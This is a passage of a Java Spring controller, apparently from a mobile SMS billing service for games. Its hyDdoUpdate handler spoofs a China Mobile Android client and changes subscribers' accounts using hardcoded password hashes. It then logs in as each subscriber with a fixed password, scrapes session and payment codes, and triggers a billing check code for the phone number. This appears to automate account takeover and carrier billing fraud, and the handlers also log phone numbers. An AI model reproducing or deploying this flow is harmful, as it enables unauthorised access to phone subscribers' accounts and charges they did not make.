		JSONObject respJson = new JSONObject();
		respJson.put("status", STATUS_RESP_FAILED);
		
		String requestStr = request.getQueryString();
		
		StringBuffer logBuffer = new StringBuffer();
		logBuffer.append("汉娱DDO业务短信验证参数为： " + requestStr);
		
		try {
			pw = response.getWriter();
			
			String orderid = RequestUtil.GetParamString(request, "orderid", null);
			String verify_code = RequestUtil.GetParamString(request, "verifycode", null);
			
			ReceiveSms receiveSms = orderService.queryReceiveSmsById(orderid);
			
			if (receiveSms != null) {
				receiveSms.setHret(HRET_SECOND);
					   
			    String url = "http://115.238.48.254:9059/jf/platform/ddoCash/sendValidCode?validCode=" + verify_code + "&orderno=" + orderid;
				StrIntBag resp = HttpClientUtil.executeGet(url);
				
				MyLog.InfoLog("hyDdoVerifyCode request : " + url + ", resp: " + resp);
				
				if (resp != null && resp._str != null) {
					JSONObject respObject = JSONObject.parseObject(resp._str);
					
					boolean result = respObject.getBooleanValue("result");
					String msg = respObject.getString("msg");
					if (result) {
						respJson.put("status", STATUS_RESP_SUCCESS);
						receiveSms.setStatus(STATUS_SECOND); //计费短信发送成功
					} else {
						respJson.put("status", STATUS_FAILED);
						receiveSms.setStatus(STATUS_FAILED);
					}
					receiveSms.setExt(msg);
				}
				
				orderService.updateReceiveSms(receiveSms);
			}
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyDdoVerifyCode error : " + e.getMessage());
		}
		
		logBuffer.append(",服务端响应： " + respJson.toString());
		logger.info(logBuffer);
		
		pw.print(respJson.toString());
		return null;
	}
	
	@RequestMapping("/hyDdoPjNotify.do")
	public ModelAndView hyDdoPjReport(HttpServletRequest request, HttpServletResponse response) {
		return null;
	}
	
	
	@RequestMapping("/hyDdoUpdate.do")
	public ModelAndView hyDdoUpdate(HttpServletRequest request, HttpServletResponse response) {
		String params = request.getQueryString();

		StringBuffer logBuffer = new StringBuffer();
		logBuffer.append("汉娱世纪DDO业务账号升级请求参数：" + params);
		
		JSONObject jObject = new JSONObject();
		jObject.put("status", STATUS_RESP_FAILED);
		PrintWriter pw = null;
		
		try {
			pw = response.getWriter();
			
			String verifyCode = RequestUtil.GetParamString(request, "verifycode", null);
			Long orderId = RequestUtil.GetParamLong(request, "orderid", null);
			
			ReceiveSms receiveSms = orderService.queryReceiveSmsById(String.valueOf(orderId));
			
			if (receiveSms != null) {
				HttpClient client = new HttpClient(); 
				PostMethod phonePostMethod = new PostMethod("http://wap.dm.10086.cn/ClientAndroid/upgrade_to_migu.hisun");
				
				NameValuePair[] data = {
		                new NameValuePair("new_password", "C74FF7B8A69DDABFCC90A452E79053E2"),
		                new NameValuePair("mobile_num", encrypt(receiveSms.getPhoneno())),
		                new NameValuePair("password", "0BC7696E46A9AA2AF7A66A01177AE7B9"),
		                new NameValuePair("email", ""),
		                new NameValuePair("validate_code", verifyCode),
		                new NameValuePair("is_supportIDMP", "True"),
		                new NameValuePair("sessionID", receiveSms.getExt()),
		                new NameValuePair("uSessionID", ""),
		        };
				
				Map<String, String> headMap = getHeadMap();
			    
			    for (Map.Entry<String, String> entry : headMap.entrySet()) {  
			    	phonePostMethod.addRequestHeader(entry.getKey(),entry.getValue());  
			    }  
			   	
			    phonePostMethod.setRequestBody(data);
			   	
			   	client.executeMethod(phonePostMethod);
			   	
			   	String resp = getGzipResponseBodyAsString(phonePostMethod);
			   	
			   	MyLog.InfoLog("手机号： " + receiveSms.getPhoneno() + ",升级咪咕账号结果响应： " + resp);
			   	
			   	if (resp != null) {
			   		JSONObject json = JSONObject.parseObject(resp);
			   		
			   		if ("0".equals(json.getString("code"))) { 
			   			String appId = Config.get().get("appid_hyddo");
						String appKey = Config.get().get("appkey_hyddo");
						String channelId = Config.get().get("channelid_hyddo");
						
						String needSign = receiveSms.getId() + "&" + appId + "&" + appKey + "&" + receiveSms.getConsumecode() + "&" + receiveSms.getTransido() + "&" + channelId;
						
						StringBuffer sb = new StringBuffer();
						sb.append("RequestID=");
						sb.append(receiveSms.getId());
						sb.append("&AppID=");
						sb.append(appId);
						sb.append("&feecode=");
						sb.append(receiveSms.getConsumecode());
						sb.append("&PayCode=");
						sb.append(receiveSms.getConsumecode());
						sb.append("&TimeStamp=");
						sb.append(receiveSms.getTransido());
						sb.append("&ChannelID=");
						sb.append(channelId);
						sb.append("&Signature=");
						sb.append(Base64Util.encode(MD5Util.getUpperCaseMd5(needSign).getBytes()));
						
						HttpClient httpClient = new HttpClient();
						
						GetMethod getMethod0 = new GetMethod("http://wap.dm.10086.cn/apay/orderHandle.jsp?" + sb.toString());
						
						httpClient.getParams().setCookiePolicy(CookiePolicy.BROWSER_COMPATIBILITY);
						httpClient.executeMethod(getMethod0);
						
						String text0 = getMethod0.getResponseBodyAsString();
						
						String ssoUrl = "";
						
						if (text0.indexOf("var ssoUrl") > 0) {
							int beginIndex = text0.indexOf("var ssoUrl") + 14;
							int endIndex = text0.indexOf(";", text0.indexOf("var ssoUrl"));
							ssoUrl = text0.substring(beginIndex, endIndex - 1);
							System.out.println("ss0 url:" + ssoUrl);
						}
						
						Cookie[] cookies = httpClient.getState().getCookies();
			            String tmpcookies= "";
			            for(Cookie c:cookies){
			                tmpcookies += c.toString()+";";
			            }
						
						GetMethod getMethod1 = new GetMethod(ssoUrl);
						httpClient.executeMethod(getMethod1);
						getMethod1.setRequestHeader("cookie",tmpcookies);
						String text = getMethod1.getResponseBodyAsString();
//						
						org.jsoup.nodes.Document doc = Jsoup.parse(text); 
						org.jsoup.nodes.Element form = doc.select("form").first();
				    	String action = form.attr("action"); //登录 
				    	
				    	PostMethod postMethod1 = new PostMethod("http://wap.dm.10086.cn" + action);
					   	 
					        //设置登陆时要求的信息，一般就用户名和密码，验证码自己处理了
					        NameValuePair[] data1 = {
					                new NameValuePair("username", receiveSms.getPhoneno()),
					                new NameValuePair("password", Base64Util.encode("123_456".getBytes())),
					                new NameValuePair("lt", doc.select("input[name=lt]").val()),
					                new NameValuePair("execution", doc.select("input[name=execution]").val()),
					                new NameValuePair("_eventId", doc.select("input[name=_eventId]").val()),
					                new NameValuePair("user_hackRemember", doc.select("input[name=user_hackRemember]").val()),
					        };
					        postMethod1.setRequestBody(data1);
					        
//					        Cookie[] cookies2 = httpClient.getState().getCookies();
//					    	String tmpcookies2= "";
//					    	for(Cookie c:cookies2){
//				                tmpcookies2 += c.toString()+";";
//				            }
				            
//					    	postMethod.setRequestHeader("cookie",tmpcookies2);
					        int statusCode = httpClient.executeMethod(postMethod1);
					        
//					        String text2 = postMethod1.getResponseBodyAsString();
					        String location = "";
				            if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY  
				                    || statusCode == HttpStatus.SC_MOVED_TEMPORARILY) {  
				                // 从头中取出转向的地址  
				                Header locationHeader = postMethod1.getResponseHeader("location");  
//				                String location = null;  
				                if (locationHeader != null) {  
				                     location = locationHeader.getValue();  
//				                    log.info("The page was redirected to:" + location);  
//				                    response= methodPost(location,data);//用跳转后的页面重新请求。  
				                } else {  
				                    logger.error("Location field value is null.");  
				                }  
				            } else {
				            	logger.info(postMethod1.getStatusLine());
				            }
				            
				            GetMethod getMethod2 = new GetMethod(location);
							httpClient.executeMethod(getMethod2);
//							getMethod1.setRequestHeader("cookie",tmpcookies);
							String text3 = getMethod2.getResponseBodyAsString();
				            
				            
							int beginIndex = text3.indexOf("var paycode") + 15;
							int endIndex = text3.indexOf(";", text3.indexOf("var paycode"));
							
							String payCode = text3.substring(beginIndex,endIndex -1);
							
//							String[] str = getDmINfo(location);
							
							beginIndex = text3.indexOf("var sessionid") + 17;
							endIndex = text3.indexOf(";", text3.indexOf("var sessionid"));
							String sessionId = text3.substring(beginIndex,endIndex -1);
							
							beginIndex = text3.indexOf("var orderId") + 15;
							endIndex = text3.indexOf(";", text3.indexOf("var orderId"));
							String orderId_mg = text3.substring(beginIndex,endIndex -1);
							
							String ext = payCode + "|" + sessionId + "|" + orderId_mg;
							
							String urlGetCode = "http://wap.dm.10086.cn/apay/handle.jsp?t=checkcode&paycode=" + payCode + "&sss=" + sessionId + "&order=" + orderId_mg + "&msisdn=" + receiveSms.getPhoneno();
							
							StrIntBag getCodeBag = HttpClientUtil.executeGet(urlGetCode);
							
							if (getCodeBag != null && getCodeBag._int == 200) {
								
								JSONObject jObject2 = JSONObject.parseObject(getCodeBag._str);
								String returnCode = jObject2.getString("ReturnCode");
								
								if ("0".equals(returnCode)) {
									receiveSms.setExt(ext);
									orderService.updateReceiveSms(receiveSms);
									jObject.put("orderid", receiveSms.getId());
									jObject.put("status", STATUS_RESP_SUCCESS);
								} else {
									jObject.put("status", returnCode);
								}
							}
			   		}
			   	}
			}
			
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyDdoUpdate error :" + e.getMessage());
		}
		
		logBuffer.append(",服务端响应为：" + jObject.toString());
		logger.info(logBuffer.toString());
		
		pw.print(jObject.toString());
		return null;
	}
	
	@RequestMapping("/hyDdoDyyReport.do")
	public ModelAndView hyDdoDyyReport(HttpServletRequest request, HttpServletResponse response) {
		return null;
	}
	
	
	private Map<String, String> getHeadMap() {
		Map<String, String> headMap = new HashMap<String, String>();
		headMap.put("platform","android");
		headMap.put("isGzip", "1");
		headMap.put("login_tag", "-1");
		headMap.put("version", "4.7.1259");
		headMap.put("province_id", "");
		headMap.put("channel", "0000");
		headMap.put("connection", "keep-alive");
		headMap.put("Accept-Encoding", "gzip");
		headMap.put("Content-Type", "application/x-www-form-urlencoded");
		
		return headMap;
	}
	
	private String encrypt(String phone) {
		return DdoSign.encode(phone);
	}
	
	 private static String getGzipResponseBodyAsString(HttpMethod postMethod) throws IOException {
	        if (postMethod.getResponseBody() != null) {
	                InputStream is = postMethod.getResponseBodyAsStream();
	                GZIPInputStream gzin = new GZIPInputStream(is);
	                
	                InputStreamReader isr = new InputStreamReader(gzin, "UTF-8");
	                java.io.BufferedReader br = new java.io.BufferedReader(isr);
	                StringBuffer sb = new StringBuffer();
	                String tempbf;
	                while ((tempbf = br.readLine()) != null) {
	                    sb.append(tempbf);
	                }
	                isr.close();
	                gzin.close();
	                return sb.toString();
	        } else {
	            return null;
	        }
	    }
	 
	 @RequestMapping("/getCityIncome.do")
		public ModelAndView getCityIncome(HttpServletRequest request, HttpServletResponse response) {
			String month = RequestUtil.GetParamString(request, "month", null);
			String gameId = RequestUtil.GetParamString(request, "gameId", null);
			
			List<ReceiveSms> list = orderService.getCityIncomeByGameId(month, gameId);
			
			if (list != null && list.size() > 0) {
				logger.info("need update size:" + list.size());
				
				ReceiveSms  receiveSms = null;
				
				for (int i = 0; i < list.size(); i++) {
					receiveSms = list.get(i);
					
					if (MobileFromUtil.veriyMobile(receiveSms.getPhoneno())) {
						String cityStr = MobileFromUtil.getMobileFrom(receiveSms.getPhoneno());
						
						String[] array = cityStr.split(",");
						
						String province = array[0];
						String cityName = "";
						if (array.length == 2) {
							cityName = array[1];
						}
						
						orderService.updateCity(receiveSms.getId(), month, province, cityName);
					}
					logger.info("update id:" + receiveSms.getId() + ",success");
				}
				logger.info("end..........");
			}
			return null;
		}
	 
	 @RequestMapping("/updateStateIncome.do")
	 public ModelAndView updateStateIncome(HttpServletRequest request, HttpServletResponse response) {
			String day = RequestUtil.GetParamString(request, "day", "");
			String gameId = RequestUtil.GetParamString(request, "gameId", null);
			Long chnl_id = RequestUtil.GetParamLong(request, "chnlId", -1L);
			
			List<ReceiveSms> list = orderService.getChnlIncomeByGameId(day, gameId, chnl_id);
			
			if (list != null && list.size() > 0) {
				logger.info("need update size:" + list.size());
				
				ReceiveSms  receiveSms = null;
				
				for (int i = 0; i < list.size(); i++) {
					receiveSms = list.get(i);
					
					if (MobileFromUtil.veriyMobile(receiveSms.getPhoneno())) {
						String cityStr = MobileFromUtil.getMobileFrom(receiveSms.getPhoneno());
						
						String[] array = cityStr.split(",");
						
						String province = array[0];
						
						System.out.println(province);
						
						orderService.updateState(receiveSms.getId(), province);
					}
					logger.info("update id:" + receiveSms.getId() + ",success");
				}
				logger.info("end..........");
			}
			return null;
		}
}
